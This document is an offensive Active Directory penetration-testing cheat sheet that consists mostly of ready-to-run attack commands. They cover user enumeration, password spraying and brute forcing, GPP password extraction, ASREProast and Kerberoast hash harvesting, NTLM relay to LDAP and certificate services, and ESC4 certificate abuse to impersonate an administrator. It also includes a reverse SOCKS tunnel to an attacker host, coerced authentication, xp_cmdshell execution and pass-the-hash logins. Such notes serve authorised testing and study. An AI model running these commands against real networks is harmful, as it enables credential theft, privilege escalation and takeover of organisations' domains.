# Active Directory

# Table of Contents

- [Active Directory](#active-directory)
- [Table of Contents](#table-of-contents)
  - [Useful information](#useful-information)
- [Black Box](#black-box)
  - [Recon](#recon)
    - [Get DC IP](#get-dc-ip)
    - [Enumerate users](#enumerate-users)
      - [RPC command](#rpc-command)
      - [Brute force RID (RPC)](#brute-force-rid-rpc)
      - [Brute force username (as a last resort)](#brute-force-username-as-a-last-resort)
    - [SMB shares](#smb-shares)
      - [Check if a guest user can access the shares](#check-if-a-guest-user-can-access-the-shares)
      - [Check if NULL session is authorized](#check-if-null-session-is-authorized)
    - [LDAP](#ldap)
  - [Exploit](#exploit)
    - [Brute force passwords](#brute-force-passwords)
    - [SMB shares](#smb-shares-1)
      - [GPP passwords](#gpp-passwords)
      - [Find interesting files](#find-interesting-files)
    - [LDAP](#ldap-1)
      - [ASREProast](#asreproast)
      - [Kerberoast](#kerberoast)
    - [ZeroLogon](#zerologon)
    - [](#)
- [Grey Box](#grey-box)
  - [Recon](#recon-1)
    - [Find ADCS](#find-adcs)
    - [Get DNS records](#get-dns-records)
    - [Find ADCS misconfigurations](#find-adcs-misconfigurations)
      - [Linux](#linux)
      - [Windows](#windows)
    - [Map relationships within Active Directory](#map-relationships-within-active-directory)
      - [Windows (prefered)](#windows-prefered)
      - [Linux](#linux-1)
    - [Find interesting files in SMB shares](#find-interesting-files-in-smb-shares)
      - [Windows (prefered)](#windows-prefered-1)
      - [Linux](#linux-2)
  - [Exploit](#exploit-1)
    - [LDAP not signed](#ldap-not-signed)
    - [ADCS exploitation](#adcs-exploitation)
      - [ESC4](#esc4)
      - [Web Enrollment](#web-enrollment)
  - [RPC](#rpc)
    - [rpcclient](#rpcclient)
  - [Kerbrute](#kerbrute)
  - [SMB](#smb)
    - [smbclient](#smbclient)
  - [MSSQL](#mssql)
    - [mssqlclient](#mssqlclient)
  - [WinRM](#winrm)
    - [Evil-WinRM](#evil-winrm)
  - [RDP](#rdp)
    - [xfreerdp](#xfreerdp)
  - [Bloodhound](#bloodhound)
    - [Bloodhound python (sharpHound)](#bloodhound-python-sharphound)
    - [Launch neo4j](#launch-neo4j)
  - [crackmapexec](#crackmapexec)
    - [smb](#smb-1)

<!-- Created by https://github.com/ekalinin/github-markdown-toc -->

### Useful information

- Blank LMhash : `aad3b435b51404eeaad3b435b51404ee`

# Black Box

## Recon

### Get DC IP

```bash
nslookup -type=srv _ldap._tcp.dc._msdcs."$DOMAIN"
```

### Enumerate users

#### RPC command

```bash
rpcclient -U '' -I "$DC_HOST" -c "enumdomusers"
```

#### Brute force RID (RPC)

```bash
nxc smb $DC_IP -u '' -p '' --rid-brute
```

#### Brute force username (as a last resort)

```bash
kerbrute userenum --domain "$DOMAIN" usernames.txt
```

### SMB shares

#### Check if a guest user can access the shares

```bash
nxc smb $IP -u 'guest' -p '' --shares
```

Note: This command can also be sprayed over a range of IPs

```bash
nxc smb $IP/24 -u 'guest' -p '' --shares
```

#### Check if NULL session is authorized

```bash
nxc smb $IP -u '' -p '' --shares
```

### LDAP

```bash
ldapsearch -H "ldap://$DC_IP" -x -s base namingcontexts
```

```bash
ldapsearch -H "ldap://$DC_IP" -x -b "DC=DOMAIN,DC=LOCAL"
```

If you receive the followin error, valid credentials are needed:

```
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

## Exploit

### Brute force passwords

Check if users have the same password as their username

```bash
kerbrute passwordspray --user-as-pass --domain "$DOMAIN" users.txt
```

Check if users have empty password

```bash
kerbrute passwordspray --domain "$DOMAIN" users.txt ''
```

### SMB shares

#### GPP passwords

If the guest user has access to the SYSVOL share, it is possible to extract the GPP passwords if any

```bash
Get-GPPPassword "$DOMAIN"/"":""@"$DC_HOST"
```

You can also use the netexec module :

```bash
nxc smb $DC_IP -u '' -p '' -M gpp_password -M gpp_autologin
```

#### Find interesting files

[snafflepy](https://github.com/asmtlab/snafflepy.git) can be used to quickly identify interesting files on SMB shares

```bash
python3 snaffler.py -u '' -p '' -d "$DOMAIN" -n ips.txt
```

### LDAP

#### ASREProast

Get ASREProastable users.

```bash
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
```

#### Kerberoast

If you managed to identify an ASREProastable user, it is possible to identify Kerberoastable users without knowing its password.

```bash
GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
```

### ZeroLogon

Check If the target is vulnerable to ZeroLogon

```bash
nxc smb $DC_IP -u '' -p '' -M zerologon
```

###

# Grey Box

## Recon

### Find ADCS

```bash
nxc ldap $DC_IP -u $USER -p $PASSWORD -M adcs
```

### Get DNS records

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump
```

### Find ADCS misconfigurations

Link : [Certify](https://github.com/GhostPack/Certify)  
Link : [Certipy](https://github.com/ly4k/Certipy)

#### Linux

```bash
certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD" -old-bloodhound -vulnerable -stdout
```

#### Windows

```bash
Certify.exe find /vulnerable
```

### Map relationships within Active Directory

Link : [SharpHound](https://github.com/SpecterOps/SharpHound)  
Link : [Old Sharphound](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpHound.exe)

#### Windows (prefered)

```bash
SharpHound.exe -c All
```

#### Linux

```bash
bloodhound-ce.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST"
```

old bloodhound

```bash
bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST"
```

### Find interesting files in SMB shares

Link : [Snaffler](https://github.com/SnaffCon/Snaffler)  
Link : [snafflepy](https://github.com/asmtlab/snafflepy)

#### Windows (prefered)

Print result to stdout and to a file

```bash
Snaffler.exe -s -o snaffler.log
```

#### Linux

```bash
python3 snaffler.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -n ips.txt
```

## Exploit

### LDAP not signed

If the LDAP service is not signed, it is possible to privesc localy on a workstation that is domain joined.

1. Setup a SOCKS proxy and a port forward

On the attacker machine :

```bash
chisel server -p $PORT --reverse --socks5
```

On the victim machine :

```bash
chisel client $ATTACKER_IP:$PORT R:1234:socks 8080:127.0.0.1:8080
```

2. Setup the LDAP relay

```bash
ntlmrelayx -t ldap://$DC_IP --shadow-credentials --shadow-target $MACHINE_NAME -smb2support --http-port 8080
```

3. Enable the WebClient service

By default, the WebClient service is disabled. However, it is possible to enable it as an unprivileged user if the GPO "_Turn of the display of thumbnails and only display icons_" is configured.

```bash
Rocabella.exe lnk -t $ATTACKER_IP -p $PORT -s attacker.ico -o $FILE_NAME
```

Then, just double click on the file to enable the WebClient service.

4. Relay the authentication

```bash
nxc smb $MACHINE_NAME -u "$USER" -p "$PASSWORD" -M coerce_plus -o LISTENER="$MACHINE_NAME@8080/abcd"
```

5. Obtain a TGT for the Machine Account

```bash
gettgtpkinit.py -cert-pfx $PFX -pfx-pass $PFX_PASS $DOMAIN/$MACHINE_NAME $MACHINE_CCACHE_FILE
```

6. Impersonate a domain admin account on the machine

```bash
gets4uticket.py kerberos+ccache://$DOMAIN\\$MACHINE_NAME:$MACHINE_CCACHE_FILE@$DC_HOST cifs@$MACHINE_NAME.$DOMAIN Administrator@$DOMAIN Administrator.ccache -v
```

### ADCS exploitation

#### ESC4

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -target "$TARGET" -ca "$CA_NAME" -template "$TemplateName" -upn 'administrator'
```

e.g.

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -target '10.10.10.10' -ca 'LOCAL-DC01-CA' -template UserAuthentication -upn 'administrator'
```

#### Web Enrollment

If the ADCS is configured to allow :

- NTLM authentication
- NTLM authentication is not protected by EPA or SMB signing
- Web enrollment is enabled

It is then possible to coerce to authenticate to an attacker controlled machine and relay this authentication towards the ADCS.

1. Setup the relay

```bash
ntlmrelayx -smb2support --target http://lab.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
```

2. Coerce the DC to authenticate to the attacker controlled machine

```bash
nxc smb $DC_IP -u "$USER" -p "$PASSWORD" -M coerce_plus -o LISTENER="$ATTACKER_IP"
```

[WIP]

### Scheduled Task as another user (local or domain)

```powershell
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Arguments "/c whoami"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType LocalService
# $Principal = New-ScheduledTaskPrincipal -UserId "DOMAIN\USER" -LogonType Interactive
$Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger
Register-ScheduledTask -TaskName "MyScheduledTask" -InputObject $Task


Start-ScheduledTask -TaskName "MyScheduledTask"


Unregister-ScheduledTask -TaskName "MyScheduledTask" -Confirm:$false
```


## RPC

### rpcclient

1. Connect to a RPC service as an anonymous user

```bash
rpcclient -U "%" X.X.X.X
```

2. Connect to a RPC service as a user

```bash
rpcclient -U "<user>%<password>" X.X.X.X
```

3. Useful rpc commands

<details>
  <summary>Users enumeration</summary>

```bash
querydispinfo # List users
enumdomusers # List users
queryuser <0xrid> # User details
queryusergroups <0xrid> # User groups
lookupnames <username> # SID
queryuseraliases [builtin|domain] <sid> # Aliases
```

</details>

<details>
  <summary>Group enumeration</summary>

```bash
enumdomgroups # List groups
querygroup  <0xrid> # Group details
querygroupmem  <0xrid> # Group members
```

</details>

<details>
  <summary>Domains enumeration</summary>

```bash
enumdomains # List domains
lsaquery # Get SID
querydominfo # Domain info:
```

</details>
<details>
  <summary>Shares enumeration</summary>

```bash
netshareenumall # Enumerate all available shares
netsharegetinfo <share> # Info about a share
```

</details>

<details>
  <summary>More SIDs</summary>

```bash
lookupnames <username> # Find SIDs by name
lsaenumsid # Find more SIDs
lookupsids <sid> # RID cycling (check more SIDs)
```

</details>

## Kerbrute

source : https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

1. Enumerate users

```bash
kerbrute userenum --dc X.X.X.X -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

2. Check if a user has the same password as his username

```bash
kerbrute bruteuser --dc X.X.X.X -d <domain> <user> ./user.txt
```

3. Bruteforce passwords

```bash
kerbrute bruteuser --dc X.X.X.X -d <domain> <user> /usr/share/seclists/Passwords/rockyou.txt
```

## SMB

### smbclient

1. map the share

```bash
smbmap -H X.X.X.X
```

2. Connect to a SMB service as an anonymous user

```bash
smbclient -L //X.X.X.X
```

3. Connect to a SMB service as a user

```bash
smbclient -L //X.X.X.X -U "<user>%<password>"
```

4. Connect to a SMB service as a user and list files

```bash
smbclient //X.X.X.X -U "<user>%<password>"
```

## MSSQL

### mssqlclient

1. Connect to a MSSQL service as an anonymous user

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U sa
```

2. Connect to a MSSQL service as a user

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U <user> -P <password>
```

2. Connect to a MSSQL service as a user with the hash

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U <user> -hashes <LM>:<NT>
```

4. Useful mssql commands

<details>
  <summary>Users enumeration</summary>

```bash
SELECT name FROM master..syslogins
```

</details>

<details>
  <summary>Database enumeration</summary>

```bash
SELECT name FROM master..sysdatabases
```

</details>

<details>
  <summary>Remote Command execution</summary>

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

</details>

## WinRM

### Evil-WinRM

source : `sudo apt install evil-winrm`

1. Connect to a WinRM service as a user

```bash
evil-winrm -i X.X.X.X -u <user> -p <password>
```

2. Connect to a WinRM service as a user with the hash

```bash
evil-winrm -i X.X.X.X -u <user> -H <NThash>
```

## RDP

### xfreerdp

1. Connect to a RDP service as a user

```bash
xfreerdp /u:<user> /p:<password> /v:X.X.X.X
```

2. Connect to a RDP service as a user with the hash

```bash
xfreerdp /u:<user> /pth:<NThash> /v:X.X.X.X
```

## Bloodhound

### Bloodhound python (sharpHound)

```bash
bloodhound-python -d <domain> -u <user> -p <password> -gc X.X.X.X -c all -ns X.X.X.X --zip
```

### Launch neo4j

```bash
sudo neo4j console
# in another shell
bloodhound
```

## crackmapexec

### smb
